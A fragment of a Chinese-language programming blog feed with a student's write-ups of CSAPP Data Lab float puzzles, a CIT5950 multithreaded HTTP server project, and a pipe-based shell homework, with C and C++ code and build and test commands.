<span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>   <span class=\"token keyword\">float</span> f <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>uf <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">23</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">23</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>   <span class=\"token comment\">// then get the exact sign, E and value of the number</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>   <span class=\"token keyword\">int</span> s <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>sign <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      s <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>   <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      s <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>   <span class=\"token keyword\">int</span> E <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>   <span class=\"token keyword\">float</span> frac <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>   <span class=\"token keyword\">int</span> bias <span class=\"token operator\">=</span> <span class=\"token number\">127</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>      <span class=\"token comment\">// denormalized number</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token comment\">// E = 1 - bias</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      E <span class=\"token operator\">=</span> <span class=\"token number\">1</span> <span class=\"token operator\">-</span> bias<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      <span class=\"token comment\">// frac = f</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>      frac <span class=\"token operator\">=</span> f<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>   <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e <span class=\"token operator\">==</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>      <span class=\"token comment\">//! COMPARE WITH 0XFF INSTEAD OF ~0</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>      <span class=\"token comment\">// special number</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>      <span class=\"token comment\">// if frac = 0, then value = inf</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>f <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>         <span class=\"token comment\">// frac = 1 / 0;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>         <span class=\"token keyword\">return</span> <span class=\"token number\">0x80000000u</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>         <span class=\"token comment\">// if frac != 0, value = NaN</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>         <span class=\"token keyword\">return</span> <span class=\"token number\">0x80000000u</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>   <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>      <span class=\"token comment\">// normalized number</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>      <span class=\"token comment\">// E = e - bias</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>      E <span class=\"token operator\">=</span> e <span class=\"token operator\">-</span> bias<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>      <span class=\"token comment\">// value = 1 + f</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>      frac <span class=\"token operator\">=</span> <span class=\"token number\">1</span> <span class=\"token operator\">+</span> f<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>E <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>   <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>E <span class=\"token operator\">></span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>      <span class=\"token comment\">//! REMEMBER THE SITUATION THAT E > 31</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token number\">0x80000000u</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>   <span class=\"token keyword\">return</span> s <span class=\"token operator\">*</span> frac <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> E<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>本题需要返回浮点数转化后的 int 类型数值。需要我们对浮点数的结构有所了解，并且其转化为 int 后需要切割掉小数部分，此外，我们还需要判断指数过大的情况（溢出）。</p>\n<p>本题中我们采用的步骤是：</p>\n<ol>\n<li>提取出浮点数三个部分，计算符号位的值</li>\n<li>当 <code>e == 0</code>  时，为特殊值的情况， <code>E = 1 - bias</code> ， <code>frac = f</code></li>\n<li>当 <code>e == 0xff</code>  时（注意不是 <code>~0/0xffffffff</code> , 容易写错！），返回 <code>0x80000000u</code></li>\n<li>以上两种情况都不是，则该数为规格化数， <code>E = e - bias; frac = 1 + f;</code></li>\n</ol>\n<p>最后，我们需要进行<strong>特殊情况的分类讨论</strong>：</p>\n<ol>\n<li>E &lt; 0, 则最后生成的结果（无论规格化还是非规格化）肯定是个小数，打头的是 0 那种，要切割为 <code>int</code>  类型，小数部分就被切割掉了</li>\n<li>E &gt; 31, 超过了指数可以表示的范围（算是溢出了？），返回 <code>0x80000000u</code></li>\n<li>正常情况下返回 <code>s * frac * (1 &lt;&lt; E)</code></li>\n</ol>\n<h2 id=\"floatpower2\"><a class=\"markdownIt-Anchor\" href=\"#floatpower2\">#</a> floatPower2</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> *   (2.0 raised to the power x) for any 32-bit integer x.</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> *   The unsigned value that is returned should have the identical bit</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> *   representation as the single-precision floating-point number 2.0^x.</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> *   If the result is too small to be represented as a denorm, return</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> *   0. If too large, return +INF.</pre></td></tr><tr><td data-num=\"9\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"10\"></td><td><pre> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while</pre></td></tr><tr><td data-num=\"11\"></td><td><pre> *   Max ops: 30</pre></td></tr><tr><td data-num=\"12\"></td><td><pre> *   Rating: 4</pre></td></tr><tr><td data-num=\"13\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token function\">floatPower2</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   <span class=\"token comment\">//! REMEMEBER THAT FLOATING POINT ITSELF IS IN THE FORMAT (-1)^S * M * 2.0^E</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token comment\">// fit x into E</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>   x <span class=\"token operator\">=</span> x <span class=\"token operator\">+</span> <span class=\"token number\">127</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>   <span class=\"token comment\">//! MIND THE SITUATION THAT X IS TOO LARGE OR TOO SMALL</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">>=</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      x <span class=\"token operator\">=</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>   <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      x <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>   <span class=\"token keyword\">unsigned</span> result <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">23</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>   <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>因为浮点数表示法本身就是以 2 为底，所以本实验就相当于如何把 x 转化为那个 8 位的阶码。因为 <code>阶码 = 指数 + bias</code> ，这里 <code>bias = 127</code> ，因此这里 <code>E = x + 127</code> 。然后和上一题一样，我们需要判断一下 x 的范围是否在 <code>0xff</code>  和 <code>0</code>  之间。最后将 x 移动到阶码的位置返回 ( <code>return x &lt;&lt; 23</code> ) 即可。</p>\n<h2 id=\"参考实现\"><a class=\"markdownIt-Anchor\" href=\"#参考实现\">#</a> 参考实现</h2>\n<p>在完成 data lab 过程中，我参考了部分如下几个博客的实现:</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MTQxMjY3OTU=\">CSAPP 实验一：DataLab 详细讲解与满分代码</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NDk4Nzc0NzU=\">lab1 CSAPP：datalab</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NTc0ODExMTI=\">CSAPP lab1: datalab</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kaW5nZmVuLmdpdGh1Yi5pby9jc2FwcC8yMDIxLzA0LzMwL0NTQVBQTGFiMDEuaHRtbA==\">深入理解计算机系统之位操作实验</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vanlpMnlhL3AvMTU4ODExNzUuaHRtbA==\">CSAPP Data Lab 做题记录（下</span></li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/01/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/CIT5950/CIT5950_Project/",
            "url": "https://salvely.github.io/blog/2024/01/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/CIT5950/CIT5950_Project/",
            "title": "Final Project: 多线程HTTP服务器 实现记录",
            "date_published": "2024-01-08T02:32:56.000Z",
            "content_html": "<blockquote>\n<p>进入课程网页的时候意外发现这个 Project 的代码已经被填完了。所以没什么好做的。</p>\n</blockquote>\n<h1 id=\"overview\"><a class=\"markdownIt-Anchor\" href=\"#overview\">#</a> Overview</h1>\n<p>多线程网络服务器大致功能：简单的搜索和文件浏览</p>\n<ul>\n<li>Part A: 实现服务器读取文件，统计文件中的单词个数</li>\n<li>Part B: 实现网络连接和 HTTP 请求响应</li>\n<li>Part C: 将 A 和 B 两部分结合起来</li>\n</ul>\n<h2 id=\"part-a\"><a class=\"markdownIt-Anchor\" href=\"#part-a\">#</a> Part A</h2>\n<h3 id=\"filereadercc\"><a class=\"markdownIt-Anchor\" href=\"#filereadercc\">#</a>  <code>FileReader.cc</code></h3>\n<ul>\n<li>简单的文件阅读器</li>\n<li>在构建时读入文件名， <code>read_file</code>  将整个文件读入一个 <code>string</code></li>\n<li>可以使用 <code>POSIX</code> , C 接口或者 C++ 文件流实现</li>\n</ul>\n<h3 id=\"wordindexh-wordindexcc\"><a class=\"markdownIt-Anchor\" href=\"#wordindexh-wordindexcc\">#</a>  <code>WordIndex.h &amp; WordIndex.cc</code></h3>\n<p>实现一个数据结构，用于存储各个文件中的单词及其出现次数</p>\n<h3 id=\"crawlfiletreecc\"><a class=\"markdownIt-Anchor\" href=\"#crawlfiletreecc\">#</a>  <code>CrawlFileTree.cc</code></h3>\n<p>实现 <code>HandleFile</code>  函数，其获取一个文件名和一个 <code>WordIndex</code> ，这个函数读取对应文件，并且将每个单词及其对应的个数存储在 <code>WordIndex</code>  中</p>\n<h2 id=\"part-b\"><a class=\"markdownIt-Anchor\" href=\"#part-b\">#</a> Part B</h2>\n<h3 id=\"serversocketcc\"><a class=\"markdownIt-Anchor\" href=\"#serversocketcc\">#</a>  <code>ServerSocket.cc</code></h3>\n<p>实现一个类，这个类包含：</p>\n<ul>\n<li>创建一个服务器端的监听 socket</li>\n<li>从客户端接受新的连接请求</li>\n<li><code>ServerSocket.h</code>  中提供了头文件，需要在 <code>ServerSocket.cc</code>  中实现</li>\n</ul>\n<h3 id=\"httpconnectioncc\"><a class=\"markdownIt-Anchor\" href=\"#httpconnectioncc\">#</a>  <code>HttpConnection.cc</code></h3>\n<ul>\n<li><code>HttpConnection</code>  处理 <code>HTTP</code>  连接请求，将该请求转化为一个对象，并且负责将响应写回去</li>\n<li>该函数中主要实现 <code>HTTP</code>  请求的读取和解析 (string 操作)</li>\n</ul>\n<h3 id=\"httputilscc\"><a class=\"markdownIt-Anchor\" href=\"#httputilscc\">#</a>  <code>HttpUtils.cc</code></h3>\n<p>主要负责一些其他功能，尤其是安全方面：</p>\n<ul>\n<li><code>escape_html</code>\n<ul>\n<li>用于防止 <code>cross-site scripting</code> ，参考<span class=\"exturl\" data-url=\"aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9Dcm9zcy1zaXRlX3NjcmlwdGluZw==\"> Cross-site scripting</span></li>\n</ul>\n</li>\n<li><code>in_path_safe</code>\n<ul>\n<li>保证使用该服务器的人只能获取到对应目录下的文件，其他目录下对他不开放权限</li>\n<li>否则可能会有攻击者使用 <code>directory traverse attack</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"part-c\"><a class=\"markdownIt-Anchor\" href=\"#part-c\">#</a> Part C</h2>\n<ul>\n<li><code>HttpServer_ThrFn</code>  函数实现\n<ul>\n<li>每个线程可以获取到一个连接</li>\n</ul>\n</li>\n<li>两个 <code>helper_function</code>\n<ul>\n<li>分别处理两种类型的请求\n<ul>\n<li>对查看文件的请求 ( <code>ProcessFileRequest</code> )</li>\n<li>执行查询的请求 ( <code>ProcessQueryRequest</code> )</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>使用 <code>htttp</code>  测试 <code>Http Server</code> 。输入命令 <code>./httpd 3000 ./test_tree/</code> ，在显示 <code>accepting connections...</code>  后，点击下方的 <code>Open Server on port 3000</code></li>\n</ul>\n<h2 id=\"实现步骤\"><a class=\"markdownIt-Anchor\" href=\"#实现步骤\">#</a> 实现步骤</h2>\n<ol>\n<li><code>FileReader::read_file</code></li>\n<li><code>WordIndex.cc &amp; WordIndex.h</code></li>\n<li><code>CrawlFileTree.cc handle_file函数</code></li>\n<li><code>ServerSocket.cc</code></li>\n<li><code>get_request &amp; parse_request from HttpConnection.cc</code></li>\n<li><code>write_response in HttpConnection.cc</code></li>\n<li><code>HttpUtils.cc</code>  两个函数实现</li>\n<li>test_suite 通过</li>\n<li>valgrind 通过</li>\n<li><code>HttpServer.cc</code>  实现并测试</li>\n</ol>\n<h2 id=\"实现提示\"><a class=\"markdownIt-Anchor\" href=\"#实现提示\">#</a> 实现提示</h2>\n<ul>\n<li><code>boost</code>  库中的 <code>split()/trim()/replace_all()</code>  函数可以使用，使用 <code>split()</code>  时可以使用 <code>is_any_of()/isalpha()/</code></li>\n<li>实现 <code>ServerSocket.cc</code>  时，留意 <code>server_accept_rw_close</code></li>\n<li>有个小函数可以让 <code>is_path_safe</code>  的实现更简单 (留意 <code>HttpUtils.cc</code>  中的注释，自己上网学习它的用法)</li>\n<li><code>FileReader</code>  需要处理只含有 0 个字节的 <code>binary_files</code> ，这里可以使用传入 2 个参数的 <code>string</code>  构造函数</li>\n</ul>\n<h2 id=\"测试\"><a class=\"markdownIt-Anchor\" href=\"#测试\">#</a> 测试</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">make</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>./test_suite</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>valgrind ./test_suite</pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/01/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/CIT5950/CIT5950_HW4/",
            "url": "https://salvely.github.io/blog/2024/01/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/CIT5950/CIT5950_HW4/",
            "title": "HW4: Shell & Pipe 实现记录",
            "date_published": "2024-01-06T06:49:15.000Z",
            "content_html": "<h1 id=\"要求\"><a class=\"markdownIt-Anchor\" href=\"#要求\">#</a> 要求</h1>\n<p>实现一个只含有基本命令和 Pipe (不含重定向符及其他符号) 的 Shell。</p>\n<h1 id=\"指南\"><a class=\"markdownIt-Anchor\" href=\"#指南\">#</a> 指南</h1>\n<h2 id=\"相关文件\"><a class=\"markdownIt-Anchor\" href=\"#相关文件\">#</a> 相关文件</h2>\n<ul>\n<li><code>pipe_shell.cc</code> : 在其中实现 shell 程序</li>\n<li><code>sh.cc</code> : 传入一个附带参数的程序， <code>fork()</code>  子程序然后 <code>execvp()</code>  去执行它</li>\n<li><code>stdin_echo.cc</code> : 从 <code>stdin</code>  中读取，输出读取的内容，直到获取 <code>EOF</code> ，然后停止</li>\n<li><code>example_tests/</code> : 其中含有示例输入和对应输出</li>\n<li><code>solution_binaries/</code> : 官方答案执行码</li>\n</ul>\n<h2 id=\"具体要求\"><a class=\"markdownIt-Anchor\" href=\"#具体要求\">#</a> 具体要求</h2>\n<ul>\n<li>程序一次从标准输入读取一行命令</li>\n<li>一行命令包括命令本身和连接他们的 Pipe</li>\n<li>不停读入直到读入 <code>EOF</code>  / 用户输入 <code>exit</code></li>\n<li>在当前命令完成之后才能运行下一条命令</li>\n<li>命令可以是绝对路径或者是程序名（用 <code>execvp</code>  执行）</li>\n</ul>\n<h2 id=\"建议方法\"><a class=\"markdownIt-Anchor\" href=\"#建议方法\">#</a> 建议方法</h2>\n<ul>\n<li>通读该指南和提供的源代码，搞清楚作业是在做什么</li>\n<li>执行一下 <code>./solution_binaries/pipe_shell</code> ，看看结果长什么样</li>\n<li>开始实现 <code>pipe_shell.cc</code> ，从循环提示用户输入开始，并且打印 <code>$</code>  提示符，直到无输入或者遇到 <code>EOF</code>  / 输入 <code>exit</code></li>\n<li>实现 <code>fork()</code> ， <code>pipe</code>  连接和命令的执行 ( <code>execvp</code>  或者直接运行命令路径)</li>\n</ul>\n<h2 id=\"实现提示\"><a class=\"markdownIt-Anchor\" href=\"#实现提示\">#</a> 实现提示</h2>\n<ul>\n<li>可以使用 <code>boost</code>  库中的 <code>split()</code>  和 <code>trim()</code>  方法，</li>\n<li>使用 <code>execvp(), fork(), pipe(), waitpid()</code>  等函数</li>\n<li>注意不同情形：无管道，一个管道，多于一个管道</li>\n<li>两种方法\n<ul>\n<li>使用一个 pipe 数组</li>\n<li>每次 <code>fork()</code>  之前创建一个 <code>pipe</code></li>\n</ul>\n</li>\n<li>每个子进程只需要两个端口，从上一个进程送来的读端口，和给下一个子进程的写端口</li>\n<li>子进程用完端口之后关闭端口，否则程序无法正常退出</li>\n</ul>\n<h2 id=\"测试\"><a class=\"markdownIt-Anchor\" href=\"#测试\">#</a> 测试</h2>\n<ul>\n<li>普通测试:  <code>make &amp;&amp; ./pipe_shell</code></li>\n<li>内存泄漏测试:  <code>valgrind --leak-check=full ./pipe_shell</code></li>\n<li>比较自己的程序和 <code>solution_binaries/pipe_shell</code>  的结果：</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> ./tests/simple_input.txt <span class=\"token operator\">|</span> ./pipe_shell <span class=\"token operator\">&amp;></span> my_output.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">diff</span> my_output.txt ./tests/simple_output.txt</pre></td></tr></table></figure><h2 id=\"pipe_shellcc\"><a class=\"markdownIt-Anchor\" href=\"#pipe_shellcc\">#</a>  <code>pipe_shell.cc</code></h2>\n<blockquote>\n<p>实现核心： <code>pipe</code>  的内存在操作系统内核中。在每次循环前创建一个 <code>pipe</code> ，然后 <code>fork()</code>  一个子进程读取上一个 <code>pipe</code>  的内容，写入当前这个 <code>pipe</code> 。使用完毕后关闭这个 <code>pipe</code>  的写端，保留这个 <code>pipe</code>  的读端口。进而让下一次 <code>dup2</code>  导入时使用，使用完后可关闭该 <code>pipe</code>  的读端口。 <code>pipe</code>  不会像本地变量那样随着循环的进行而消失，只要保存一下读 / 写端口，在下一轮循环中就可以正常的进行读写。<br>\n此外，我们使用 <code>dup2</code>  来进行端口的重定向。</p>\n</blockquote>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span>    <span class=\"token comment\">// for fork()</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span> <span class=\"token comment\">// for pid_t</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/wait.h></span>  <span class=\"token comment\">// for wait(), waitpid(), etc.</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;cstdlib></span> <span class=\"token comment\">// for exit(), EXIT_SUCCESS, and EXIT_FAILURE</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;vector></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;boost/algorithm/string.hpp></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">BUF_SIZ</span> <span class=\"token expression\"><span class=\"token number\">1000</span></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    string s<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"$ \"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token function\">getline</span><span class=\"token punctuation\">(</span>std<span class=\"token double-colon punctuation\">::</span>cin<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>s <span class=\"token operator\">==</span> <span class=\"token string\">\"exit\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">return</span> 